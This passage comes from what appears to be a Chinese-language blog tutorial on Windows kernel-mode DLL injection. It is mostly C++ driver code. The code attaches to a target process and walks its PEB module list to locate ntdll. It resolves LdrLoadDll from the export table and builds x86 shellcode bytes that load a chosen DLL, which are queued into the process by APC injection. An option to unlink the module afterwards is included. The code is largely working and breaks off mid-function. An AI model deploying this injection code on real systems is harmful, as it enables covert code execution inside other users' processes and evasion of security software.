class="comment">//SET_PROCESS_PROTECTION Protection = &#123; 0 &#125;;</span></span><br><span class="line">PVOID NtdllModuleBase = <span class="literal">NULL</span>;</span><br><span class="line">PVOID LdrLoadDll = <span class="literal">NULL</span>;</span><br><span class="line">BOOLEAN IsWow64 = (<span class="built_in">PsGetProcessWow64Process</span>(EProcess) != <span class="literal">NULL</span>) ? TRUE : FALSE;</span><br><span class="line">LARGE_INTEGER Timeout = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程处于信号状态，中止任何操作</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">KeWaitForSingleObject</span>(EProcess, Executive, KernelMode, FALSE, &amp;Timeout) == STATUS_WAIT_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Is Terminating\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EProcess)</span><br><span class="line"><span class="built_in">ObDereferenceObject</span>(EProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_PROCESS_IS_TERMINATING;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeStackAttachProcess</span>(EProcess, &amp;Apc);   <span class="comment">//切换进程上下背景文</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DllFullPath, InjectionInfo-&gt;DllFullPath);</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;NtdllFullPath, <span class="string">L&quot;Ntdll.dll&quot;</span>);</span><br><span class="line">NtdllModuleBase = <span class="built_in">SeGetModuleBaseByModuleName</span>(EProcess, &amp;NtdllFullPath, IsWow64);  <span class="comment">//目标进程中获取Ntdll 信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!NtdllModuleBase)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Get Ntdll Base\r\n&quot;</span>);</span><br><span class="line">Status = STATUS_NOT_FOUND;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取LdrLoadDll地址</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">LdrLoadDll = <span class="built_in">SeGetExportFunctionFromModule</span>(NtdllModuleBase, <span class="string">&quot;LdrLoadDll&quot;</span>, EProcess, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!LdrLoadDll)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Get LdrLoadDll Address\r\n&quot;</span>);</span><br><span class="line">Status = STATUS_NOT_FOUND;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Call LdrLoadDll</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">SIZE_T RegionSize = <span class="number">0</span>;</span><br><span class="line">PINJECTION_DATA InjectionData = </span><br><span class="line">IsWow64 ? <span class="built_in">GetWow64Code</span>(LdrLoadDll, &amp;DllFullPath) : <span class="built_in">GetNativeCode</span>(LdrLoadDll, &amp;DllFullPath);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Status = <span class="built_in">ApcInjection</span>(InjectionData, (HANDLE)InjectionInfo-&gt;TargetProcessID, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (InjectionInfo-&gt;IsUnlinkModule)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ZwFreeVirtualMemory</span>(<span class="built_in">ZwCurrentProcess</span>(), &amp;InjectionData, &amp;RegionSize, MEM_RELEASE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">KeUnstackDetachProcess</span>(&amp;Apc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;PsLookupProcessByProcessId() Error\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EProcess)</span><br><span class="line"><span class="built_in">ObDereferenceObject</span>(EProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从目标进程通过模块名称获取模块基地址"><a href="#从目标进程通过模块名称获取模块基地址" class="headerlink" title="从目标进程通过模块名称获取模块基地址"></a>从目标进程通过模块名称获取模块基地址</h4><ol><li>检查EProcess</li><li>对WOW64和64位进程分别获取指定的PEB，并等待Loader初始化，然后再模块列表中搜索指定的模块名称，如果找到就返回基地址。注意WOW64需要转UNICODE</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">SeGetModuleBaseByModuleName</span><span class="params">(IN PEPROCESS EProcess, IN PUNICODE_STRING ModuleName, IN BOOLEAN IsWow64)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EProcess == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">LARGE_INTEGER Timeout = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Timeout.QuadPart = <span class="number">-250ll</span> * <span class="number">10</span> * <span class="number">1000</span>;     <span class="comment">//250 msec.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Wow64 进程</span></span><br><span class="line"><span class="keyword">if</span> (IsWow64)</span><br><span class="line">&#123;</span><br><span class="line">PPEB32 Peb32 = (PPEB32)<span class="built_in">PsGetProcessWow64Process</span>(EProcess);</span><br><span class="line"><span class="keyword">if</span> (Peb32 == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;PsGetProcessWow64Process() Error\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待加载器</span></span><br><span class="line"><span class="keyword">for</span> (INT i = <span class="number">0</span>; !Peb32-&gt;Ldr &amp;&amp; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Loader Not Intialiezd\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">KeDelayExecutionThread</span>(KernelMode, TRUE, &amp;Timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有加载</span></span><br><span class="line"><span class="keyword">if</span> (!Peb32-&gt;Ldr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Loader Was Not Intialiezd In Time\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在InLoadOrderModuleList链表中查找</span></span><br><span class="line"><span class="keyword">for</span> (PLIST_ENTRY32 ListEntry = (PLIST_ENTRY32)((PPEB_LDR_DATA32)Peb32-&gt;Ldr)-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">ListEntry != &amp;((PPEB_LDR_DATA32)Peb32-&gt;Ldr)-&gt;InLoadOrderModuleList;</span><br><span class="line">ListEntry = (PLIST_ENTRY32)ListEntry-&gt;Flink)</span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING v1;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY32 LdrDataTableEntry32 = <span class="built_in">CONTAINING_RECORD</span>(ListEntry, LDR_DATA_TABLE_ENTRY32, InLoadOrderLinks);</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlUnicodeStringInit</span>(&amp;v1, (PWCH)LdrDataTableEntry32-&gt;BaseDllName.Buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">RtlCompareUnicodeString</span>(&amp;v1, ModuleName, TRUE) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> (PVOID)LdrDataTableEntry32-&gt;DllBase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PPEB64 Peb64 = <span class="built_in">PsGetProcessPeb</span>(EProcess);</span><br><span class="line"><span class="keyword">if</span> (!Peb64)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;PsGetProcessPeb() Error\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待加载器</span></span><br><span class="line"><span class="keyword">for</span> (INT i = <span class="number">0</span>; !Peb64-&gt;Ldr &amp;&amp; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Loader Not Intialiezd\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">KeDelayExecutionThread</span>(KernelMode, TRUE, &amp;Timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有加载</span></span><br><span class="line"><span class="keyword">if</span> (!Peb64-&gt;Ldr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Loader Was Not Intialiezd In Time\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在InLoadOrderModuleList链表中查找</span></span><br><span class="line"><span class="keyword">for</span> (PLIST_ENTRY64 ListEntry = (PLIST_ENTRY64)((PPEB_LDR_DATA64)Peb64-&gt;Ldr)-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">ListEntry != &amp;((PPEB_LDR_DATA64)Peb64-&gt;Ldr)-&gt;InLoadOrderModuleList;</span><br><span class="line">ListEntry = (PLIST_ENTRY64)ListEntry-&gt;Flink)</span><br><span class="line">&#123;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY64 LdrDataTableEntry64 = <span class="built_in">CONTAINING_RECORD</span>(ListEntry, LDR_DATA_TABLE_ENTRY64, InLoadOrderLinks);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">RtlCompareUnicodeString</span>(&amp;LdrDataTableEntry64-&gt;BaseDllName, ModuleName, TRUE) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> LdrDataTableEntry64-&gt;DllBase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Exception:Code: 0x%X\n&quot;</span>, <span class="built_in">GetExceptionCode</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从目标模块获取目标函数导出地址"><a href="#从目标模块获取目标函数导出地址" class="headerlink" title="从目标模块获取目标函数导出地址"></a>从目标模块获取目标函数导出地址</h4><p>PE文件分析</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">SeGetExportFunctionFromModule</span><span class="params">(IN PVOID ModuleBase, IN PCCHAR FunctionName, IN PEPROCESS EProcess, IN PUNICODE_STRING ModuleName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ModuleBase;</span><br><span class="line">PIMAGE_NT_HEADERS32 ImageNtHeader32 = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_NT_HEADERS64 ImageNtHeader64 = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY ImageExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line">ULONG ImageExportDirectoryLength = <span class="number">0</span>;</span><br><span class="line">ULONG_PTR FunctionAddress = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ModuleBase == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ImageNtHeader32 = (PIMAGE_NT_HEADERS32)((PUCHAR)ModuleBase + ImageDosHeader-&gt;e_lfanew);</span><br><span class="line">ImageNtHeader64 = (PIMAGE_NT_HEADERS64)((PUCHAR)ModuleBase + ImageDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (ImageNtHeader32-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 64位</span></span><br><span class="line"><span class="keyword">if</span> (ImageNtHeader32-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)</span><br><span class="line">&#123;</span><br><span class="line">ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageNtHeader64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)ModuleBase);</span><br><span class="line">ImageExportDirectoryLength = ImageNtHeader64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 32位</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageNtHeader32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)ModuleBase);</span><br><span class="line">ImageExportDirectoryLength = ImageNtHeader32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUSHORT AddressOfNameOrdinals = (PUSHORT)(ImageExportDirectory-&gt;AddressOfNameOrdinals + (ULONG_PTR)ModuleBase);</span><br><span class="line">PULONG  AddressOfNames = (PULONG)(ImageExportDirectory-&gt;AddressOfNames + (ULONG_PTR)ModuleBase);</span><br><span class="line">PULONG  AddressOfFunctions = (PULONG)(ImageExportDirectory-&gt;AddressOfFunctions + (ULONG_PTR)ModuleBase);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; ++i)</span><br><span class="line">&#123;</span><br><span class="line">USHORT Index = <span class="number">0xFFFF</span>;</span><br><span class="line">PCHAR  v1 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按索引查找</span></span><br><span class="line"><span class="keyword">if</span> ((ULONG_PTR)FunctionName &lt;= <span class="number">0xFFFF</span>)</span><br><span class="line">&#123;</span><br><span class="line">Index = (USHORT)i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 按名字查找</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((ULONG_PTR)FunctionName &gt; <span class="number">0xFFFF</span> &amp;&amp; i &lt; ImageExportDirectory-&gt;NumberOfNames)</span><br><span class="line">&#123;</span><br><span class="line">v1 = (PCHAR)(AddressOfNames[i] + (ULONG_PTR)ModuleBase);</span><br><span class="line">Index = AddressOfNameOrdinals[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 参数错误</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((ULONG_PTR)FunctionName &lt;= <span class="number">0xFFFF</span> &amp;&amp; (USHORT)((ULONG_PTR)FunctionName) == Index + ImageExportDirectory-&gt;Base) ||</span><br><span class="line">((ULONG_PTR)FunctionName &gt; <span class="number">0xFFFF</span> &amp;&amp; <span class="built_in">strcmp</span>(v1, FunctionName) == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">FunctionAddress = AddressOfFunctions[Index] + (ULONG_PTR)ModuleBase;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是不是一个递归的导出  FuntionAddress = //Dll.Sub_4</span></span><br><span class="line"><span class="keyword">if</span> (FunctionAddress &gt;= (ULONG_PTR)ImageExportDirectory &amp;&amp; FunctionAddress &lt;= (ULONG_PTR)ImageExportDirectory</span><br><span class="line">+ ImageExportDirectoryLength)</span><br><span class="line">&#123;</span><br><span class="line">WCHAR v1[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ANSI_STRING ForwarderString = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ANSI_STRING ForwarderFunctionName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">UNICODE_STRING ForwarderModuleName = &#123; <span class="number">0</span> &#125;;  <span class="comment">//maxLength    Length  wchar*</span></span><br><span class="line">ULONG DelimIdx = <span class="number">0</span>;</span><br><span class="line">PVOID ForwardModuleBase = <span class="literal">NULL</span>;</span><br><span class="line">PVOID ForwardFunctionAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统镜像不支持</span></span><br><span class="line"><span class="keyword">if</span> (EProcess == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlInitAnsiString</span>(&amp;ForwarderString, (PCSZ)FunctionAddress);  <span class="comment">//FuntionAddress = //Dll.Sub_4........</span></span><br><span class="line"><span class="built_in">RtlInitEmptyUnicodeString</span>(&amp;ForwarderModuleName, v1, <span class="built_in">sizeof</span>(v1));</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlAnsiStringToUnicodeString</span>(&amp;ForwarderModuleName, &amp;ForwarderString, FALSE);</span><br><span class="line"><span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; ForwarderModuleName.Length / <span class="built_in">sizeof</span>(WCHAR); j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ForwarderModuleName.Buffer[j] == <span class="string">L&#x27;.&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">ForwarderModuleName.Length = (USHORT)(j * <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">ForwarderModuleName.Buffer[j] = <span class="string">L&#x27;\0&#x27;</span>;</span><br><span class="line">DelimIdx = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取下一个模块的导出地址（递归的调用自己）</span></span><br><span class="line"><span class="built_in">RtlInitAnsiString</span>(&amp;ForwarderFunctionName, ForwarderString.Buffer + DelimIdx + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">RtlAppendUnicodeToString</span>(&amp;ForwarderModuleName, <span class="string">L&quot;.dll&quot;</span>);</span><br><span class="line">ForwardModuleBase = <span class="built_in">SeGetModuleBaseByModuleName</span>(EProcess, &amp;ForwarderModuleName, <span class="built_in">PsGetProcessWow64Process</span>(EProcess) != <span class="literal">NULL</span>);</span><br><span class="line">ForwardFunctionAddress = <span class="built_in">SeGetExportFunctionFromModule</span>(ForwardModuleBase, </span><br><span class="line">ForwarderFunctionName.Buffer, EProcess, &amp;ForwarderModuleName);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ForwardFunctionAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (PVOID)FunctionAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取ShellCode"><a href="#获取ShellCode" class="headerlink" title="获取ShellCode"></a>获取ShellCode</h4><p>WOW64</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_INJECTION_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">UCHAR ShellCode[<span class="number">0x200</span>];</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING   DllFullPath;</span><br><span class="line">UNICODE_STRING32 DllFullPath32;</span><br><span class="line">&#125;;</span><br><span class="line">BOOLEAN IsUnlinkModule;              <span class="comment">// Unlink module after injection</span></span><br><span class="line"><span class="type">wchar_t</span> BufferData[<span class="number">488</span>];   <span class="comment">//??   APC使用</span></span><br><span class="line">PVOID ModuleBase;          <span class="comment">//??</span></span><br><span class="line">ULONG CallComplete;</span><br><span class="line">&#125;INJECTION_DATA, *PINJECTION_DATA;</span><br><span class="line"></span><br><span class="line"><span class="function">PINJECTION_DATA <span class="title">GetWow64Code</span><span class="params">(IN PVOID LdrLoadDll, IN PUNICODE_STRING DllFullPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PINJECTION_DATA RemoteBufferData = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T RemoteBufferLength = PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">UCHAR ShellCode[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                       <span class="comment">// push ModuleHandle            offset +1 </span></span><br><span class="line"><span class="number">0x68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                       <span class="comment">// push ModuleFileName          offset +6</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,                                <span class="comment">// push Flags  </span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,                                <span class="comment">// push PathToFile</span></span><br><span class="line"><span class="number">0xE8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                       <span class="comment">// call LdrLoadDll              offset +15</span></span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                       <span class="comment">// mov edx, COMPLETE_OFFSET     offset +20</span></span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x1E</span>, <span class="number">0x37</span>, <span class="number">0xC0</span>,     <span class="comment">// mov [edx], CALL_COMPLETE            //给APC使用</span></span><br><span class="line"><span class="number">0xC2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>                        <span class="comment">// ret 4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Status = <span class="built_in">ZwAllocateVirtualMemory</span>(<span class="built_in">ZwCurrentProcess</span>(), &amp;RemoteBufferData, <span class="number">0</span>, &amp;RemoteBufferLength, 